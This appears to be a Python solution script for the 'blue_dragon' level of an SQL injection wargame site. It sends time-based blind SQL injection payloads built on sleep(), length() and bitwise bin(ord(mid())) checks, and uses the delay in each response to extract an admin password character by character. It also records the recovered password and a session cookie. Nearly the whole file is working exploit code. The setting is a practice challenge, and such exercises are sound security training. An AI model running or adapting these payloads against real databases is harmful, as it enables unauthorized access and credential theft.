import requests
from time import time


def get(id, pw=''):
    return requests.get(
        'https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php',
        params={"id":id, "pw":pw},
        cookies={'PHPSESSID': 'k2re1rtpnv4o5ul7dcu3b5kbn0'}).text

# get length
length = 1
while True:
    print("Try length", length)
    before = time()
    get(f"' or sleep(if(id='admin'&&length(pw)={length},2,0))-- -")
    after = time()

    if after - before > 2:
        break
    
    length += 1

print("Length is", length)

# get char_length
char_length = 7 # by big length..

# get password
password = ''
for index in range(1, length + 1):
    tmp = ''
    for bit in range(1, char_length + 1):
        before = time()
        
        get(f"' or sleep(if(id='admin' and mid(lpad(bin(ord(mid(pw,{index},1))),{char_length},0),{bit},1),2, 0)) -- -")
        after = time()

        if after - before > 2:
            tmp += '1'
        else:
            tmp += '0'
        print(tmp)

    password += chr(int(tmp, 2))
    print(password)

# password is d948b8a0

# certify
print(get('', password))
